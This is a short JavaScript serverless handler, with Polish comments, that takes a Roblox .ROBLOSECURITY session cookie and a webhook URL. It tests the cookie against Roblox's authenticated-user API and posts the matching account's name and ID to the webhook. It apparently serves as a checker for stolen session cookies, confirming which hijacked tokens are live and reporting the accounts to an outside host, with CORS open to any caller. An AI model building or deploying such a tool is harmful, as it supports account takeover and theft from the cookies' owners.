const axios = require('axios');

export default async function handler(req, res) {
    // Nagłówki CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method !== 'POST') return res.status(405).json({ error: "Użyj metody POST" });

    const { cookie, webhookUrl } = req.body;

    if (!cookie || !webhookUrl) {
        return res.status(400).json({ success: false, message: "Brak cookie lub linku do webhooka" });
    }

    try {
        // Sprawdzanie konta
        const robloxRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            },
            timeout: 5000 // Serwer nie będzie czekał wiecznie
        });

        const { id, name } = robloxRes.data;

        // Wysyłka na Webhook
        await axios.post(webhookUrl, {
            content: `✅ Działa! Konto: **${name}** (ID: ${id})`
        });

        return res.status(200).json({ success: true, user: name });

    } catch (error) {
        // Jeśli Roblox odrzuci połączenie (np. IP-Lock)
        let msg = "Błąd połączenia";
        if (error.response) {
            msg = `Roblox API Error: ${error.response.status}`;
        }
        
        return res.status(200).json({ success: false, message: msg });
    }
}
